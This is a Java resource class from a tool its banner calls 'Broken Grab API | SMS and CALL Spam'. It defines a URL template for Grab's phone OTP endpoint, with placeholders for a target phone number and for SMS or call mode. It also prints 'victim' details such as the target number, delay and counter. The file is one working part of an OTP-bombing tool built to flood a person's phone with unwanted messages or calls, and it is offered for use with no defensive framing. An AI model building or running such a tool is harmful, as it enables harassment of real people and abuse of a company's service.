package xyz.un4.grab.brokenapi.resouces;

import xyz.un4.grab.brokenapi.model.GrabRequest;

public class Resource {
	
	public static final String BASE_URL = "https://api.grab.com/grabid/v1/phone/otp?method=${METHOD}&countryCode=TH&phoneNumber=${TARGET_NUMBER}&templateID=&numDigits=5";
	
	public static final String stars = new String(new char[50]).replace("\0", "*");
	
	public static void printBanner() {
		System.out.println(stars);
		System.out.println("Broken Grab API | SMS and CALL Spam JAVA Version by un4ckn0wl3z");
		System.out.println(stars);
	}
	

	public static void printVictimDetails(GrabRequest grabRequest) {
		System.out.println(stars);
		System.out.println("[*] Target Number>> ".concat(grabRequest.getTargetNumber()));
		System.out.println("[*] Delay>> ".concat(""+grabRequest.getDelay()));
		System.out.println("[*] Counter>> ".concat(""+grabRequest.getCounter()));
		System.out.println("[*] Method>> ".concat(grabRequest.getMethod()));
		System.out.println(stars);
	}
	
}
